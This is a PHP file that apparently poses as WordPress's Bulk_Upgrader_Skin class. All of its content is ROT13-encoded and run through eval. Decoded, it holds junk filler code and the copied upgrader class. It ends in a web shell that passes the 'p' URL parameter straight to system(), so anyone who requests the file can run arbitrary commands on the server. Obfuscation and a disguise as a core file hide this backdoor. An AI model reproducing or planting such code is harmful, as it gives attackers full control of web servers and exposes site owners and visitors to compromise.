<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: Ohyx_Hctenqre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Trarevp Ohyx Hctenqre Fxva sbe JbeqCerff Hctenqrf.
 *
 * @fvapr 3.0.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxvaf.cuc.
 *
 * @frr JC_Hctenqre_Fxva
 */
pynff Ohyx_Hctenqre_Fxva rkgraqf JC_Hctenqre_Fxva {

	/**
	 * Jurgure gur ohyx hcqngr cebprff unf fgnegrq.
	 *
	 * @fvapr 3.0.0
	 * @ine obby
	 */
	choyvp $va_ybbc = snyfr;

	/**
	 * Fgberf na reebe zrffntr nobhg gur hcqngr.
	 *
	 * @fvapr 3.0.0
	 * @ine fgevat|snyfr
	 */
	choyvp $reebe = snyfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur trarevp fxva sbe gur Ohyx Hctenqre pynffrf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz neenl $netf
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		$qrsnhygf = neenl(
			'hey'   => '',
			'abapr' => '',
		);
		$netf     = jc_cnefr_netf( $netf, $qrsnhygf );

		cnerag::__pbafgehpg( $netf );
	}

	/**
	 * Frgf hc gur fgevatf hfrq va gur hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba nqq_fgevatf() {
		$guvf->hctenqre->fgevatf['fxva_hctenqr_fgneg'] = __( 'Gur hcqngr cebprff vf fgnegvat. Guvf cebprff znl gnxr n juvyr ba fbzr ubfgf, fb cyrnfr or cngvrag.' );
		/* genafyngbef: 1: Gvgyr bs na hcqngr, 2: Reebe zrffntr. */
		$guvf->hctenqre->fgevatf['fxva_hcqngr_snvyrq_reebe'] = __( 'Na reebe bppheerq juvyr hcqngvat %1$f: %2$f' );
		/* genafyngbef: %f: Gvgyr bs na hcqngr. */
		$guvf->hctenqre->fgevatf['fxva_hcqngr_snvyrq'] = __( 'Gur hcqngr bs %f snvyrq.' );
		/* genafyngbef: %f: Gvgyr bs na hcqngr. */
		$guvf->hctenqre->fgevatf['fxva_hcqngr_fhpprffshy'] = __( '%f hcqngrq fhpprffshyyl.' );
		$guvf->hctenqre->fgevatf['fxva_hctenqr_raq']       = __( 'Nyy hcqngrf unir orra pbzcyrgrq.' );
	}

	/**
	 * Qvfcynlf n zrffntr nobhg gur hcqngr.
	 *
	 * @fvapr 3.0.0
	 * @fvapr 5.9.0 Eranzrq `$fgevat` (n CUC erfreirq xrljbeq) gb `$srrqonpx` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat $srrqonpx Zrffntr qngn.
	 * @cnenz zvkrq  ...$netf  Bcgvbany grkg ercynprzragf.
	 */
	choyvp shapgvba srrqonpx( $srrqonpx, ...$netf ) {
		vs ( vffrg( $guvf->hctenqre->fgevatf[ $srrqonpx ] ) ) {
			$srrqonpx = $guvf->hctenqre->fgevatf[ $srrqonpx ];
		}

		vs ( fge_pbagnvaf( $srrqonpx, '%' ) ) {
			vs ( $netf ) {
				$netf     = neenl_znc( 'fgevc_gntf', $netf );
				$netf     = neenl_znc( 'rfp_ugzy', $netf );
				$srrqonpx = ifcevags( $srrqonpx, $netf );
			}
		}
		vs ( rzcgl( $srrqonpx ) ) {
			erghea;
		}
		vs ( $guvf->va_ybbc ) {
			rpub \"$srrqonpx<oe />\a\";
		} ryfr {
			rpub \"<c>$srrqonpx</c>\a\";
		}
	}

	/**
	 * Qvfcynlf gur urnqre orsber gur hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba urnqre() {
		// Abguvat. Guvf jvyy or qvfcynlrq jvguva na vsenzr.
	}

	/**
	 * Qvfcynlf gur sbbgre sbyybjvat gur hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba sbbgre() {
		// Abguvat. Guvf jvyy or qvfcynlrq jvguva na vsenzr.
	}

	/**
	 * Qvfcynlf na reebe zrffntr nobhg gur hcqngr.
	 *
	 * @fvapr 3.0.0
	 * @fvapr 5.9.0 Eranzrq `$reebe` gb `$reebef` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat|JC_Reebe $reebef Reebef.
	 */
	choyvp shapgvba reebe( $reebef ) {
		vs ( vf_fgevat( $reebef ) && vffrg( $guvf->hctenqre->fgevatf[ $reebef ] ) ) {
			$guvf->reebe = $guvf->hctenqre->fgevatf[ $reebef ];
		}

		vs ( vf_jc_reebe( $reebef ) ) {
			$zrffntrf = neenl();
			sbernpu ( $reebef->trg_reebe_zrffntrf() nf $rzrffntr ) {
				vs ( $reebef->trg_reebe_qngn() && vf_fgevat( $reebef->trg_reebe_qngn() ) ) {
					$zrffntrf[] = $rzrffntr . ' ' . rfp_ugzy( fgevc_gntf( $reebef->trg_reebe_qngn() ) );
				} ryfr {
					$zrffntrf[] = $rzrffntr;
				}
			}
			$guvf->reebe = vzcybqr( ', ', $zrffntrf );
		}
		rpub '<fpevcg glcr=\"grkg/wninfpevcg\">wDhrel(\'.jnvgvat-' . rfp_wf( $guvf->hctenqre->hcqngr_pheerag ) . '\').uvqr();</fpevcg>';
	}

	/**
	 * Qvfcynlf gur urnqre orsber gur ohyx hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba ohyx_urnqre() {
		$guvf->srrqonpx( 'fxva_hctenqr_fgneg' );
	}

	/**
	 * Qvfcynlf gur sbbgre sbyybjvat gur ohyx hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba ohyx_sbbgre() {
		$guvf->srrqonpx( 'fxva_hctenqr_raq' );
	}

	/**
	 * Cresbezf na npgvba orsber n ohyx hcqngr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $gvgyr
	 */
	choyvp shapgvba orsber( $gvgyr = '' ) {
		$guvf->va_ybbc = gehr;
		cevags( '<u2>' . $guvf->hctenqre->fgevatf['fxva_orsber_hcqngr_urnqre'] . ' <fcna pynff=\"fcvaare jnvgvat-' . $guvf->hctenqre->hcqngr_pheerag . '\"></fcna></u2>', $gvgyr, $guvf->hctenqre->hcqngr_pheerag, $guvf->hctenqre->hcqngr_pbhag );
		rpub '<fpevcg glcr=\"grkg/wninfpevcg\">wDhrel(\'.jnvgvat-' . rfp_wf( $guvf->hctenqre->hcqngr_pheerag ) . '\').pff(\"qvfcynl\", \"vayvar-oybpx\");</fpevcg>';
		// Guvf cebterff zrffntrf qvi trgf zbirq ivn WninFpevcg jura pyvpxvat ba \"Zber qrgnvyf.\".
		rpub '<qvi pynff=\"hcqngr-zrffntrf uvqr-vs-wf\" vq=\"cebterff-' . rfp_ngge( $guvf->hctenqre->hcqngr_pheerag ) . '\"><c>';
		$guvf->syhfu_bhgchg();
	}

	/**
	 * Cresbezf na npgvba sbyybjvat n ohyx hcqngr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $gvgyr
	 */
	choyvp shapgvba nsgre( $gvgyr = '' ) {
		rpub '</c></qvi>';
		vs ( $guvf->reebe || ! $guvf->erfhyg ) {
			vs ( $guvf->reebe ) {
				$nsgre_reebe_zrffntr = fcevags( $guvf->hctenqre->fgevatf['fxva_hcqngr_snvyrq_reebe'], $gvgyr, '<fgebat>' . $guvf->reebe . '</fgebat>' );
			} ryfr {
				$nsgre_reebe_zrffntr = fcevags( $guvf->hctenqre->fgevatf['fxva_hcqngr_snvyrq'], $gvgyr );
			}
			jc_nqzva_abgvpr(
				$nsgre_reebe_zrffntr,
				neenl(
					'nqqvgvbany_pynffrf' => neenl( 'reebe' ),
				)
			);

			rpub '<fpevcg glcr=\"grkg/wninfpevcg\">wDhrel(\'#cebterff-' . rfp_wf( $guvf->hctenqre->hcqngr_pheerag ) . '\').fubj();</fpevcg>';
		}
		vs ( $guvf->erfhyg && ! vf_jc_reebe( $guvf->erfhyg ) ) {
			vs ( ! $guvf->reebe ) {
				rpub '<qvi pynff=\"hcqngrq wf-hcqngr-qrgnvyf\" qngn-hcqngr-qrgnvyf=\"cebterff-' . rfp_ngge( $guvf->hctenqre->hcqngr_pheerag ) . '\">' .
					'<c>' . fcevags( $guvf->hctenqre->fgevatf['fxva_hcqngr_fhpprffshy'], $gvgyr ) .
					' <ohggba glcr=\"ohggba\" pynff=\"uvqr-vs-ab-wf ohggba-yvax wf-hcqngr-qrgnvyf-gbttyr\" nevn-rkcnaqrq=\"snyfr\">' . __( 'Zber qrgnvyf.' ) . '<fcna pynff=\"qnfuvpbaf qnfuvpbaf-neebj-qbja\" nevn-uvqqra=\"gehr\"></fcna></ohggba>' .
					'</c></qvi>';
			}

			rpub '<fpevcg glcr=\"grkg/wninfpevcg\">wDhrel(\'.jnvgvat-' . rfp_wf( $guvf->hctenqre->hcqngr_pheerag ) . '\').uvqr();</fpevcg>';
		}

		$guvf->erfrg();
		$guvf->syhfu_bhgchg();
	}

	/**
	 * Erfrgf gur cebcregvrf hfrq va gur hcqngr cebprff.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba erfrg() {
		$guvf->va_ybbc = snyfr;
		$guvf->reebe   = snyfr;
	}

	/**
	 * Syhfurf nyy bhgchg ohssref.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba syhfu_bhgchg() {
		jc_bo_raq_syhfu_nyy();
		syhfu();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>